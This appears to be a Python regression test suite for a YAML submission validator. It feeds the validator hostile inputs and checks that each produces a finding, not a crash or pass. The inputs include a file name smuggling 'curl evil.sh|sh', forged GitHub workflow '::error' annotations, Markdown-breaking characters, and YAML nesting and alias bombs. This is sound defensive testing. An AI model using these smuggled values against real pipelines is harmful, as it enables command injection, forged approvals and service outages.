#!/usr/bin/env python3
# /// script
# requires-python = ">=3.10"
# dependencies = ["PyYAML~=6.0", "check-jsonschema~=0.38"]
# ///
"""Every hostile submission found by review, and what must happen to each.

    python3 validation/tests/hostile.py          # run them all
    python3 validation/tests/hostile.py -v       # show each case's output

Three rounds of review found injection variants this repository had already fixed
*elsewhere* — the same guard present in one copy and missing in another, or a new way
to break out of a format that had been escaped for a different character. Fixing those
one at a time does not converge. This is the corpus that makes each one stay fixed.

Every case is a real one somebody found. The rules they all share:

  * a hostile input produces a *finding*, never a traceback and never a crash;
  * it never produces a pass;
  * nothing it contains escapes into a shell command, a Markdown structure, a
    workflow-command line, or a terminal escape sequence.

Exit status is 0 when every case holds.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
from urllib.parse import unquote
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
VALIDATOR = REPO_ROOT / "validation" / "validate_submission.py"
RESULT_FILE = "result.json"
SCHEMA_STEP = "check-jsonschema"

# The environment every case gives its child process, with GITHUB_ACTIONS removed.
#
# `FORBIDDEN` below rests on a simple invariant: with annotations off, *any* workflow
# command in the output came from the submission, so it is an injection. That is only
# true while annotations are off — and `emit_annotations` turns itself on from
# GITHUB_ACTIONS, which every runner sets. Inherit that variable and the validator
# emits its own perfectly correct `::error ...::` lines, the corpus reads each one as
# a leak, and every case that reports a finding fails. Locally that never happened, so
# the suite was green for as long as nobody ran it in CI.
#
# The fix is not to loosen the pattern — it is for the corpus to decide the
# environment its subject runs in, rather than inheriting whatever the runner had.
CASE_ENV = {key: value for key, value in os.environ.items() if key != "GITHUB_ACTIONS"}

VALID = """\
schema_version: "1.0"
name: Placeholder Metric
applied_definition: A definition long enough to look real.
submitter_organizations:
  - Example Org
contact_email: someone@example.org
references:
  - A citation
implementation_resources:
  - https://example.org/tool
"""

# name, file name, contents, and what makes this case dangerous.
CASES = [
    (
        "shell metacharacters in the file name",
        "x;curl evil.sh|sh;.yml",
        VALID,
        "reached a copy-and-run command in the check summary and in check-pr.sh",
    ),
    (
        "workflow-command forgery via the file name",
        "a\n::error file=.github/workflows/x.yml,line=1::approved.yml",
        VALID,
        "forged an annotation with an attacker-chosen path under the App's identity",
    ),
    (
        "annotation parameter injection",
        "x,line=NOTANUM.yml",
        VALID,
        "int() raised, uncaught, killing the whole cron sweep permanently",
    ),
    (
        "trailing newline defeats an anchored pattern",
        "abc.yml\n",
        VALID,
        "$ matches before a trailing newline; every name gate let it through",
    ),
    (
        "Markdown table break via the file name",
        "a|b.yml",
        VALID,
        "a pipe forged extra cells in the findings table",
    ),
    (
        "code-span break via the file name",
        "a`b.yml",
        VALID,
        "a backtick closed the span and made the rest live Markdown",
    ),
    (
        "unhashable YAML key",
        "unhashable.yml",
        "? [a, b]\n: value\n",
        "TypeError, uncaught by `except yaml.YAMLError`, crashed the validator",
    ),
    (
        "nesting bomb",
        "deep.yml",
        "a: " + "[" * 400 + "]" * 400,
        "RecursionError from 662 bytes, 0.3% of the size cap",
    ),
    (
        "duplicate key",
        "duplicate.yml",
        VALID + "name: Something Else\n",
        "YAML keeps the last; a reviewer approves a value that is not published",
    ),
    (
        "YAML alias bomb",
        "aliases.yml",
        'schema_version: "1.0"\na: &a ["x","x"]\nb: [*a,*a,*a]\nname: boom\n',
        "a kilobyte of aliases expands to gigabytes",
    ),
    (
        "template placeholder in the contact address",
        "placeholder-email.yml",
        VALID.replace("someone@example.org", "<name@example.org>"),
        "the address pattern matched the template's own placeholder",
    ),
]

FORBIDDEN = [
    (re.compile(r"Traceback \(most recent call last\)"), "a traceback"),
    (re.compile(r"^::(error|warning|notice)[^\n]*::", re.MULTILINE), "a raw workflow command"),
    (re.compile(r"\x1b"), "a terminal escape"),
]


def run_case(filename: str, contents: str, verbose: bool) -> tuple[bool, str]:
    with tempfile.TemporaryDirectory() as scratch:
        root = Path(scratch)
        (root / "submissions").mkdir()
        try:
            (root / "submissions" / filename).write_text(contents, encoding="utf-8")
        except OSError as exc:
            return True, f"the filesystem refused the name ({exc.strerror}) — not reachable here"
        result = subprocess.run(
            [sys.executable, str(VALIDATOR), "inspect", "--files",
             f"submissions/{filename}", "--stage-dir", str(root / "stage")],
            cwd=root, capture_output=True, timeout=120, env=CASE_ENV,
        )  # fmt: skip
        # Decoded here rather than by text=True: explicit decoding with
        # errors="replace" cannot raise UnicodeDecodeError, which a locale-dependent
        # decode can.
        output = (result.stdout + result.stderr).decode("utf-8", "replace")
        code = result.returncode
        # A well-formed file with hostile *content* is inspect's pass and the schema
        # step's problem. Running only half the pipeline would assert the wrong layer.
        staged = root / "stage" / RESULT_FILE
        if code == 0 and staged.is_file():
            context = json.loads(staged.read_text())
            schema, target = context.get("schema_path"), context.get("display_path")
            if schema and target:
                schema_run = subprocess.run(
                    [SCHEMA_STEP, "--schemafile", schema, target],
                    cwd=root / "stage",
                    capture_output=True,
                    timeout=120,
                    env=CASE_ENV,
                )
                output += (schema_run.stdout + schema_run.stderr).decode("utf-8", "replace")
                code = schema_run.returncode
    if verbose:
        print("    " + output.replace("\n", "\n    ")[:900])

    if code not in (0, 1):
        return False, f"exit {code} — a crash, not a finding"
    if code == 0:
        return False, "reported a pass"
    for pattern, what in FORBIDDEN:
        if pattern.search(output):
            return False, f"output contained {what}"
    return True, "reported as a finding"


# Names aimed at the annotation line in particular. Unescaped, each one either forges a
# second annotation on its own line or adds a property the validator never set.
ANNOTATION_NAMES = [
    "x,line=NOTANUM.yml",  # a `line` property GitHub then fails to parse as a number
    "x\n::error::FORGED.yml",  # a whole second annotation, attacker-worded
    "a::b.yml",  # the delimiter itself, inside the value
    "x%0Aalready-encoded.yml",  # a percent the encoder must escape before the newline
]

# `::error file=a%3Ab.yml,line=3::text`. Properties cannot contain a raw colon — the
# encoder turns those into `%3A` — so everything up to the second `::` is the property
# list, and matching it that way is what lets a forged one be spotted.
ANNOTATION_RE = re.compile(r"^::(?:error|warning|notice)(?: (?P<props>[^:\n]*))?::")
ANNOTATION_PROPERTIES = frozenset({"file", "line", "col", "endLine", "endColumn", "title"})
NUMERIC_PROPERTIES = frozenset({"line", "col", "endLine", "endColumn"})


def check_annotations() -> list[str]:
    """`emit_annotations`, which none of the cases above reach.

    An annotation is the one place a finding is written into a line format carrying its
    own delimiters, and `emit_annotations` returns early unless GITHUB_ACTIONS is set.
    Running the corpus by hand therefore never reached it, and `run_case` now removes
    that variable on purpose — so without this, the escaping in `escape_property` is
    guarded by nothing at all. Here the same kind of hostile name meets annotations
    deliberately switched on, and the line has to parse back into exactly the properties
    the validator meant to send.
    """
    failures = []
    for filename in ANNOTATION_NAMES:
        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            (root / "submissions").mkdir()
            try:
                (root / "submissions" / filename).write_text(VALID, encoding="utf-8")
            except OSError:
                continue  # the filesystem refused the name; not reachable here either
            result = subprocess.run(
                [sys.executable, str(VALIDATOR), "inspect", "--files",
                 f"submissions/{filename}", "--stage-dir", str(root / "stage")],
                cwd=root, capture_output=True, text=True, timeout=120,
                env={**CASE_ENV, "GITHUB_ACTIONS": "true"},
            )  # fmt: skip
        output = result.stdout + result.stderr
        shown = filename.replace("\n", "\\n")

        if "Traceback (most recent call last)" in output:
            failures.append(f"{shown}: a traceback once annotations are on")
            continue

        # One finding is one line. A second means the name broke out of the first.
        emitted = [line for line in output.splitlines() if line.startswith("::")]
        if len(emitted) != 1:
            failures.append(f"{shown}: {len(emitted)} annotation lines, expected 1")
            continue

        match = ANNOTATION_RE.match(emitted[0])
        if not match:
            failures.append(f"{shown}: annotation did not parse: {emitted[0][:60]}")
            continue
        for pair in filter(None, (match["props"] or "").split(",")):
            key, _, value = pair.partition("=")
            if key not in ANNOTATION_PROPERTIES:
                failures.append(f"{shown}: forged property {key!r}")
            elif key in NUMERIC_PROPERTIES and not value.isdigit():
                failures.append(f"{shown}: property {key}={value!r} is not a number")
            elif key == "file" and unquote(value) != f"submissions/{filename}":
                # Counting lines cannot catch a `%` left unescaped: `%0A` survives our
                # own output intact and only becomes a newline when GitHub decodes it.
                # Decoding it here is reading the line the way GitHub will.
                failures.append(f"{shown}: file= decodes to {unquote(value)!r}")
    return failures


def check_static() -> list[str]:
    """Pyflakes over the scripts — the class of bug testing here cannot reach.

    This suite drives the validator through its own entry points, so a branch it
    never takes — an error path, a flag nobody passes here — can carry a name that
    does not exist and still pass every case below, then crash on the first real run.
    `ruff check --select F` catches exactly that, so it belongs in the same command
    as the rest.
    """
    try:
        result = subprocess.run(
            ["ruff", "check", "--select", "F", "--no-cache", "--quiet",
             str(REPO_ROOT / "validation")],
            capture_output=True, text=True, timeout=120,
        )  # fmt: skip
    except (OSError, subprocess.SubprocessError):
        return ["(skipped: ruff is not installed)"]
    if result.returncode == 0:
        return []
    return [line for line in result.stdout.splitlines() if line.strip()][:10]


def check_code_helper() -> list[str]:
    """The Markdown encoder, directly — the table cells depend on it."""
    spec = importlib.util.spec_from_file_location("v", VALIDATOR)
    module = importlib.util.module_from_spec(spec)
    sys.modules["v"] = module
    spec.loader.exec_module(module)
    failures = []
    for value in ["a`b", "x|y", "a\nb", "`lead", "```fence", "trail`"]:
        rendered = module.code(value)
        if "|" in rendered.replace("\\|", ""):
            failures.append(f"code({value!r}) leaked an unescaped pipe")
        body = rendered.strip("`").strip()
        ticks = len(rendered) - len(rendered.lstrip("`"))
        if re.search("`" * ticks + "(?!`)", body):
            failures.append(f"code({value!r}) can be closed from inside")
    return failures


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    print(f"{len(CASES)} hostile submissions\n")
    failed = 0
    for title, filename, contents, why in CASES:
        ok, detail = run_case(filename, contents, args.verbose)
        print(f"  {'PASS' if ok else 'FAIL'}  {title}\n        {detail}")
        if not ok:
            print(f"        regression: {why}")
            failed += 1

    print()
    skipped = []
    for label, failures in [
        ("Markdown encoder", check_code_helper()),
        ("annotation escaping", check_annotations()),
        ("undefined names (ruff --select F)", check_static()),
    ]:
        # A check that could not run is not a check that passed. Printing PASS for it
        # is how a guard stays green for months after it quietly stopped running, which
        # is the failure this corpus exists to prevent — so a skip says so, by name,
        # and the closing line stops claiming everything is handled.
        if failures and failures[0].startswith("(skipped"):
            verdict = "SKIP"
            skipped.append(label)
        else:
            verdict = "FAIL" if failures else "PASS"
            failed += len(failures)
        print(f"  {verdict}  {label}")
        for failure in failures:
            print(f"        {failure}")

    print()
    incomplete = ""
    if skipped:
        count = f"{len(skipped)} check{'' if len(skipped) == 1 else 's'}"
        incomplete = f"{count} did not run: {', '.join(skipped)}."
    if failed:
        print(f"{failed} regression(s). Each one is something review already found once.")
        if incomplete:
            # A regression and a guard that never ran are two separate facts. Printing
            # only the first sends the reader off to fix it and come back to a run that
            # still is not a full pass, having never been told why.
            print(f"Also, {incomplete}")
        return 1
    if skipped:
        # Still 0: a missing optional tool is not somebody's regression. But the run
        # is incomplete, and the last line a reader sees has to say which guards
        # nothing checked this time.
        print(f"Everything that ran is handled, but {incomplete}")
        print("This is not a full pass — re-run with those available before relying on it.")
        return 0
    print("All hostile inputs are handled.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
